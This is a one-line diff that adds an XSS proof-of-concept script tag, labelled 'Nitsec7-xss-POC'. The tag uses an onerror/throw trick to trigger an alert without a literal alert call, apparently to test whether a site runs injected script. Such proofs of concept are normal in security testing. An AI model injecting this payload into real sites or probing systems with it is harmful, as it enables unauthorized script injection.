@@ -1,0 +1,1 @@
+<script>onerror=alert;throw `Nitsec7-xss-POC`;</script>
